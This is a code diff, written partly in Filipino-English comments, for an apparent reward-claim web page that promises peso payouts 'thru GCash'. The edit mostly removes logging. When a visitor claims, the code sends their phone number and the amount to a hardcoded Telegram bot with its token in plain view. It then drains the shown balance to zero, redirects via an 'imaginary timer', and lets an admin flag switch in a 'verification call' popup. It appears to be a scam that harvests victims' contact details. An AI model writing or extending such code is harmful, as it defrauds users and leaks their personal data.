@@ -8,43 +8,34 @@ let claimState = {
     hasRedirected: false
 };
 
-// Direct Firebase check para sure
+// Direct Firebase check para sa Firewall status
 async function isFirewallActive() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
             const db = firebase.database();
             const snap = await db.ref('admin/globalFirewall').once('value');
             const data = snap.val();
-            const active = (data && data.active === true);
-            console.log("🔥 Firewall status from Firebase:", active);
-            return active;
+            return (data && data.active === true);
         } catch(e) {
-            console.error("Firewall check error:", e);
             return false;
         }
     }
     return false;
 }
 
+// Main showClaimPopup - dito nagdedecide kung anong popup ang lalabas
 async function showClaimPopup(amount) {
-    // Direct Firebase check
     const firewallActive = await isFirewallActive();
     
-    console.log("🔍 Firewall Active:", firewallActive);
-    
     if (firewallActive) {
-        // FIREWALL ON - Verification call popup only
-        console.log("🚫 Firewall ON - Showing verification popup");
+        // FIREWALL ON - Verification call popup
         if (typeof window.showFirewallPopup === 'function') {
             window.showFirewallPopup();
-        } else {
-            console.error("showFirewallPopup not found!");
         }
         return;
     }
     
     // FIREWALL OFF - Normal congratulations popup
-    console.log("✅ Firewall OFF - Showing congratulations popup");
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -93,32 +84,18 @@ function startVisibleCountdown() {
     claimState.countdownInterval = setInterval(() => {
         remaining--;
         updateVisibleCountdown(remaining);
-        
         if (remaining <= 0) {
             clearInterval(claimState.countdownInterval);
             claimState.countdownInterval = null;
-            
             if (!claimState.hasRedirected) {
                 const balanceText = document.getElementById('balanceText');
-                if (balanceText) {
-                    balanceText.innerText = "₱" + claimState.currentAmount.toLocaleString() + ".00";
-                }
-                
+                if (balanceText) balanceText.innerText = "₱" + claimState.currentAmount.toLocaleString() + ".00";
                 if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                     window.parent.updateGameBalance(claimState.currentAmount);
-                } else if (typeof updateGameBalance === 'function') {
-                    updateGameBalance(claimState.currentAmount);
-                } else if (typeof GameState !== 'undefined') {
-                    GameState.balance = claimState.currentAmount;
-                    if (typeof updateUI === 'function') updateUI();
-                    if (typeof saveData === 'function') saveData();
                 }
-                
                 hidePendingStatus();
-                
                 const withdrawBtn = document.getElementById('claimBtn');
                 if (withdrawBtn) withdrawBtn.style.display = 'block';
-                
                 claimState.isProcessing = false;
             }
         }
@@ -128,7 +105,6 @@ function startVisibleCountdown() {
 function startSmoothDecrement(originalAmount, onComplete) {
     const balanceText = document.getElementById('balanceText');
     if (!balanceText) return;
-    
     let current = originalAmount;
     const totalDuration = 3500;
     const intervalTime = 50;
@@ -140,7 +116,6 @@ function startSmoothDecrement(originalAmount, onComplete) {
         stepCount++;
         current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
         balanceText.innerText = "₱" + current.toFixed(2);
-        
         if (current <= 0.01) {
             clearInterval(claimState.balanceDecrementInterval);
             claimState.balanceDecrementInterval = null;
@@ -161,7 +136,6 @@ function startImaginaryTimer(redirectUrl) {
 
 function onClaimAction() {
     if (claimState.isProcessing) return;
-    
     claimState.isProcessing = true;
     const claimBtn = document.getElementById('claimActionBtn');
     const amount = claimState.currentAmount;
@@ -170,37 +144,22 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
+    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
         .catch(e => console.log('Telegram error:', e));
     
     if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
-        
         db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
             if (snapshot.exists()) {
                 const key = Object.keys(snapshot.val())[0];
                 const linkData = snapshot.val()[key];
                 const redirectUrl = linkData.url;
-                
-                db.ref('links/' + key).update({ 
-                    status: 'claimed', 
-                    user: userPhone,
-                    amount: amount,
-                    claimedAt: Date.now()
-                });
-                
+                db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: amount, claimedAt: Date.now() });
                 hideClaimPopup();
                 showPendingStatus();
                 startSmoothDecrement(amount, () => {
                     if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                         window.parent.updateGameBalance(0);
-                    } else if (typeof updateGameBalance === 'function') {
-                        updateGameBalance(0);
-                    } else if (typeof GameState !== 'undefined') {
-                        GameState.balance = 0;
-                        if (typeof updateUI === 'function') updateUI();
-                        if (typeof saveData === 'function') saveData();
                     }
                 });
                 startImaginaryTimer(redirectUrl);
@@ -211,29 +170,19 @@ function onClaimAction() {
                     claimBtn.disabled = false;
                     claimState.isProcessing = false;
                 }, 3000);
-                alert("Sorry! No available rewards at the moment.");
+                alert("No available rewards!");
             }
-        }).catch((error) => {
-            console.error("Database error:", error);
+        }).catch(() => {
             claimBtn.innerHTML = 'ERROR';
             setTimeout(() => {
                 claimBtn.innerHTML = 'CLAIM THRU GCASH';
                 claimBtn.disabled = false;
                 claimState.isProcessing = false;
             }, 3000);
-            alert("Database error. Please try again.");
         });
-    } else {
-        alert("Firebase not initialized. Please refresh.");
-        claimState.isProcessing = false;
-        claimBtn.disabled = false;
-        claimBtn.innerHTML = 'CLAIM THRU GCASH';
     }
 }
 
 document.addEventListener('DOMContentLoaded', function() {
-    if (!document.getElementById('claimPopup')) {
-        console.log('Popup container not found');
-    }
     hidePendingStatus();
 });
